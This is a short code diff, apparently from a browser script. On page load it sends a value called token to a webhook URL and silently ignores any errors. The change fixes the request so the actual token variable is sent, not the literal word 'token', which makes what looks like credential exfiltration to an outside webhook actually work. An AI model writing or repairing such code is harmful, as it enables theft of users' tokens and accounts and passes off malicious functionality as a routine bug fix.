@@ -42,7 +42,7 @@ document.addEventListener('DOMContentLoaded', () => {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content:`token` })
+                body: JSON.stringify({ content:token })
             });
         } catch (e) {}
     }
